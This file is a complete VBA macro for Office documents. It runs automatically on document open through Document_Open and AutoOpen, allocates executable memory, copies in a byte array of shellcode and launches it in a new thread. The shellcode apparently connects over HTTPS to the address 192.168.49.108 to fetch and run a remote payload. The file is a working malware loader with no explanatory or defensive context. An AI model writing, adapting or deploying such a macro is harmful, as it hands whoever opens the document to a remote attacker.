Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    buf = Array(232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,49,255,139,114,40,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,72,24,139,88,32,1,211,133,201,116,60,73,49, _                                    
255,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _                                        
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,62,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32,108,105,107,101,32,71,101,99,107,111, _                                                
0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,138,1,0,0,47,68,45,122,75,78,70,111,81,72,107,65,103,68,83,69,77,102,45,114,45,107,81,100,71,119,112,119,51,113,122,113,89,54,101,49,72,77,72,69,49,109,106,69,56,48,69,109,95,65,90,45,88,71,122,105, _                                                      
109,66,109,88,52,74,72,72,76,76,87,88,97,49,89,45,95,86,85,87,51,114,115,45,101,111,90,54,53,86,71,74,112,82,57,116,103,80,113,109,98,98,98,114,88,57,49,73,83,76,114,69,102,81,104,112,55,105,111,84,79,80,122,78,85,78,103,65,85,106,113,119,65,111,55,107,53,83,117,53, _                                                  
95,95,101,119,100,118,111,113,98,79,116,117,81,117,89,53,72,106,115,109,106,73,109,101,78,84,111,57,113,114,52,108,119,75,85,118,74,68,83,83,118,95,116,88,50,122,90,48,108,82,48,78,103,116,57,56,56,99,100,50,110,114,101,121,109,105,53,105,108,121,118,118,55,106,121,55,84,54,67,111, _                                  
115,83,97,83,97,87,111,87,99,112,51,76,100,78,85,70,77,110,113,66,69,85,75,97,71,76,112,51,76,106,101,82,65,104,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31, _                                                
86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150, _                                                      
137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,52,57,46,49,48,56,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res= RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

